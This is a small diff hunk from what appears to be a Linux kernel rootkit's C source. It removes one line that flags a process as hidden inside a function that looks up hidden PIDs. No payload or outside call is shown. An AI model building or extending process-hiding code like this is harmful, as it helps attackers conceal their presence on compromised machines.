@@ -323,7 +323,6 @@ bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid)
 		if (pid != node->task->pid)
 			continue;
 		if (status) {
-			status->hidden = true;
 			status->saddr = node->saddr;
 			status->task = node->task;
 		}
